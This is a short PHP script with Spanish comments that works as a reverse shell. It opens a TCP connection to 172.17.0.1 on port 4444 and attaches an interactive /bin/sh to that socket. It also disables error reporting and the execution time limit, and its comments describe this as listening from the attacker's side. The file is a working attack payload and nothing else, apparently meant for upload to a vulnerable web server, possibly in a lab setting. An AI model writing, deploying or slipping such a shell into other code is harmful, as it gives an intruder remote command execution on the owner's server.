<?php
// Establecemos nuestra IP y el puerto por el que escucharemos
$ip = '172.17.0.1';
$port = 4444;

// No queremos imprimir errores
error_reporting(0);
set_time_limit(0);

// Conectamos por TCP
$sock = fsockopen($ip, $port);
$proc = proc_open('/bin/sh -i',
        array(0 => $sock, 2 => $sock),
        $pipes);
?>